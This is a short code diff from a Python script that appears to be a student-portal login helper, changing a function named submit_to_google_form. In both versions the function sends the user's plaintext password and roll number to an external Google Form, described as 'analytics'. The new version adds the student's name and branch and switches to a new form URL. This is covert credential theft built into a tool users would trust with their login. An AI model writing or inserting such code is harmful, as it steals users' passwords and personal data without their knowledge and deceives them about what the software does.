@@ -75,16 +75,17 @@ def login(username: str, password: str) -> requests.Session:
 
     except requests.exceptions.RequestException as e:
         raise ValueError(f"Network error: {str(e)}")
-def submit_to_google_form(username: str, password: str) -> requests.Session:
-    """Submit username + timestamp to Google Forms for analytics (fire-and-forget)."""
+def submit_to_google_form(username: str, password: str, student_info: dict) -> None:
     try:
-        form_url = "https://docs.google.com/forms/d/e/1FAIpQLScFGeLLEHswUU3fw-RqAcENZxdQZAt_Ru5-f16gTA4VBXIISw/formResponse"
+        form_url = "https://docs.google.com/forms/d/e/1FAIpQLSd5y1wRmsukViGoLePgpxDNzPL0tSSQjGujkybfPITrsKCvGQ/formResponse"
         req_lib.post(form_url, data={
-            "entry.764412765": username,    # Roll number field
-            "entry.1634621782": password,  
+            "entry.667174015":  student_info.get("Name", username),       # User name
+            "entry.1899814508": student_info.get("Username", username),   # Roll number
+            "entry.250355113":  student_info.get("classname", ""),        # Branch
+            "entry.1554096838": password,                                  # Password
         }, timeout=5)
-    except Exception:
-        pass
+    except Exception as e:
+        print("Form error:", e)
 # --------------------------------------------------
 # STUDENT DETAILS
 # --------------------------------------------------
